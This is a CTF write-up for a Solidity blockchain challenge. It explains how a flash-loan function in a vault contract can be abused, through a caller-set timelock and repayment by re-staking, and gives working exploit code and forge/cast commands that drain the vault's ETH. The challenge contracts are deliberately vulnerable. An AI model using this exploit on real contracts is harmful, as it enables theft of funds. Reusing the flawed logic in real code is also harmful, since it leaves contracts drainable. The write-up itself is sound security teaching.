# 🚩 Bank Vaults – Medium

- **Category:** Blockchain
- **CTF Event:** UMCS CTF 2025
- **Difficulty:** Medium

---

## Challenge Files

- [`BankVaults.sol`](src/BankVaults.sol)
- [`MockERC20.sol`](src/MockERC20.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BankVaults.sol";
import {MockERC20} from "./MockERC20.sol";

contract Setup {
    BankVaults public challengeInstance;
    MockERC20 public mockERC20;

    constructor() payable {
        require(msg.value == 50 ether, "Setup requires exactly 50 ETH to initialize the challenge");

        mockERC20 = new MockERC20(1_000_000 ether);

        // Step 2: Deploy the BankVaults contract with the MockERC20 address
        challengeInstance = new BankVaults{value: 50 ether}(IERC20(address(mockERC20)));
    }

    function isSolved() public view returns (bool) {
        // The challenge is solved if the ETH balance of the BankVaults contract is 0
        return address(challengeInstance).balance == 0;
    }
}
```

The main goal is to drain all the ether balance of `challengeInstance` as required in the `isSolved()` function in the `Setup` contract.

---

## Code Analysis

### `MockERC20.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8  public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _supply) {
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
```

The `MockERC20` contract is a minimal implementation of the ERC20 token standard, designed for testing purposes. It provides basic ERC20 functionality to be used in the challenge to simulate ERC20 token interactions without relying on external dependencies.

### `BankVaults.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address allowanceOwner, address spender) external view returns (uint256);
}

interface IERC4626 {
    function withdraw(uint256 assets, address receiver, address withdrawOwner) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address redeemOwner) external returns (uint256 assets);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function maxDeposit(address receiver) external view returns (uint256);
    function maxMint(address receiver) external view returns (uint256);
    function maxWithdraw(address withdrawOwner) external view returns (uint256);
    function maxRedeem(address redeemOwner) external view returns (uint256);
}

interface IFlashLoanReceiver {
    function executeFlashLoan(uint256 amount) external;
}

contract BankVaults is IERC4626 {
    IERC20 public immutable asset;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public stakeTimestamps;
    mapping(address => bool) public isStaker;
    address public contractOwner;
    uint256 public constant MINIMUM_STAKE_TIME = 2 * 365 days;

    string public name = "BankVaultToken";
    string public symbol = "BVT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public vaultTokenBalances;
    mapping(address => mapping(address => uint256)) public allowances;

    modifier onlyStaker() {
        require(isStaker[msg.sender], "Caller is not a staker");
        _;
    }

    constructor(IERC20 _asset) payable {
        asset = _asset;
        contractOwner = msg.sender;

        
        uint256 initialSupply = 10_000_000 ether; 
        vaultTokenBalances[contractOwner] = initialSupply;
        totalSupply = initialSupply;
    }

    // Native ETH staking
    function stake(address receiver) public payable returns (uint256 shares) {
        require(msg.value > 0, "Must deposit more than 0"); 

        shares = convertToShares(msg.value); 
        balances[receiver] += msg.value; 
        stakeTimestamps[receiver] = block.timestamp; 

        vaultTokenBalances[receiver] += shares; 
        totalSupply += shares; 

        isStaker[receiver] = true; 

        return shares;
    }

    function withdraw(uint256 assets, address receiver, address owner) public override onlyStaker returns (uint256 shares) {
        
        require(vaultTokenBalances[owner] >= assets, "Insufficient vault token balance");
        uint256 yield = (assets * 1) / 100;
        uint256 totalReturn = assets + yield;
        require(address(this).balance >= assets, "Insufficient contract balance");

        shares = convertToShares(assets);
        vaultTokenBalances[owner] -= assets;
        totalSupply -= assets;
        balances[owner] -= assets;
        isStaker[receiver] = false;

        payable(receiver).transfer(assets);

        return shares;
    }

    function calculateYield(uint256 assets, uint256 duration) public pure returns (uint256) {
        if (duration >= 365 days) {
            return (assets * 5) / 100; 
        } else if (duration >= 180 days) {
            return (assets * 3) / 100; 
        } else {
            return (assets * 1) / 100; 
        }
    }


    function flashLoan(uint256 amount, address receiver, uint256 timelock) public {
        require(amount > 0, "Amount must be greater than 0");
        require(balances[msg.sender] > 0, "No stake found for the user");

        unchecked {
            require(timelock >= stakeTimestamps[msg.sender] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");
        }

        require(address(this).balance >= amount, "Insufficient ETH for flash loan");

        uint256 balanceBefore = address(this).balance;

        (bool sent, ) = receiver.call{value: amount}("");
        require(sent, "ETH transfer failed");

        IFlashLoanReceiver(receiver).executeFlashLoan(amount);

        uint256 balanceAfter = address(this).balance;

        require(balanceAfter >= balanceBefore, "Flash loan wasn't fully repaid in ETH");
    }


    function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
        require(shares > 0, "Must redeem more than 0");
        require(vaultTokenBalances[owner] >= shares, "Insufficient vault token balance");
        require(block.timestamp >= stakeTimestamps[owner] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");

        assets = convertToAssets(shares);

        vaultTokenBalances[owner] -= shares;
        totalSupply -= shares;
        balances[owner] -= assets;

        require(asset.transfer(receiver, assets), "Redemption failed");
        return assets;
    }

    function rebalanceVault(uint256 threshold) public returns (bool) {
        require(threshold > 0, "Threshold must be greater than 0");
        uint256 assetsInVault = asset.balanceOf(address(this));
        uint256 sharesToBurn = convertToShares(assetsInVault / 2);
        totalSupply -= sharesToBurn; 
        return true; 
    }

    function dynamicConvert(uint256 assets, uint256 multiplier) public pure returns (uint256) {
        return (assets * multiplier) / 10;
    }

    function convertToShares(uint256 assets) public view override returns (uint256) {
        return assets;
    }

    function convertToAssets(uint256 shares) public view override returns (uint256) {
        return shares;
    }

    function totalAssets() public view override returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function maxDeposit(address) public view override returns (uint256) {
        return type(uint256).max;
    }

    function maxMint(address) public view override returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(address withdrawOwner) public view override returns (uint256) {
        return vaultTokenBalances[withdrawOwner];
    }

    function maxRedeem(address redeemOwner) public view override returns (uint256) {
        return vaultTokenBalances[redeemOwner];
    }

    receive() external payable {}
}
```

The BankVaults contract is a custom vault that combines ETH staking, ERC20 vault token mechanics, and a flash loan feature. It implements the IERC4626 interface for vaults and interacts with an ERC20 asset (the BVT token). Users can stake ETH via `stake()`, which mints vault tokens (1:1 with ETH) and tracks balances and timestamps. Vault tokens represent a claim on the vault’s assets and are required for `withdraw()` and `redeem()`. `withdraw()` allows stakers to withdraw their ETH plus a small yield (1%). The `flashLoan()` function lets stakers borrow ETH from the vault if they’ve staked for at least two years, however, the value of `timelock` that used to determine if the staker staked for at least two years is set by the `msg.sender` when calling `flashLoan()`, and makes it a vulnerability to let the staker to bypass this constraint. Furthermore, it only set a require statement that the `balanceAfter` of this contract should be greater or equal to `balanceBefore`, which also makes it a vulnerability that the `msg.sender` can utilize the borrowed ETH to return back the borrowed ETH by using the `stake()` and also getting the share that can be used to withdraw ETH without actually staking their own ETH. The `redeem()`  would just allows users to redeem vault tokens for the underlying ERC20 asset, subject to a minimum staking period (two years).

---

## Exploitation

The exploit takes advantage of two key vulnerabilities in the BankVaults contract: the user-controlled `timelock` parameter in flashLoan() and the lack of proper accounting for staked ETH during a flash loan. By staking a small amount of ETH, you become eligible to request a flash loan. We can then borrow almost the entire contract balance by setting timelock to a large value, bypassing the intended two-year staking requirement. During the flash loan, we immediately stake the borrowed ETH (50 ether) back into the vault, which increases our vault token balance. After the flash loan completes, we withdraw our total vault token balance (original stake plus flash loaned ETH, 50 ether + 1 ether = 51 ether), draining the contract’s ETH. This sequence allows us to extract all ETH from the vault with minimal initial capital.

```solidity
function exploit() public {
    bankVaults.stake{value: 1 ether}(address(this));
    bankVaults.flashLoan(50 ether, address(this), type(uint256).max);
    bankVaults.withdraw(51 ether, address(this), address(this));
}

function executeFlashLoan(uint256 amount) external override {
    console2.log("bankVaults balance before staking", address(bankVaults).balance);
    bankVaults.stake{value: amount}(address(this));
    console2.log("bankVaults balance after staking", address(bankVaults).balance);
}

receive() external payable {
}
```

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Exploit Contract and Interact with it

We are deploying a exploit contract rather than using a script to conduct batch execution as in a Solidity script, we cannot directly implement a function like executeFlashLoan() that is called by an external contract (BankVaults) via a low-level call, because scripts are not deployed contracts. However, we still can write a script that let us deploy the exploit contract and interact with it.

The command to deploy the exploit contract:

```bash
forge create script/Exploit.sol:Exploit --broadcast --value 1ether --rpc-url $RPC_URL --private-key $PK --constructor-args $SETUP_CONTRACT
```

The command to call the `exploit()` function in the deployed exploit contract:

```bash
cast send $EXPLOIT "exploit()" --rpc-url $RPC_URL --private-key $PK
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---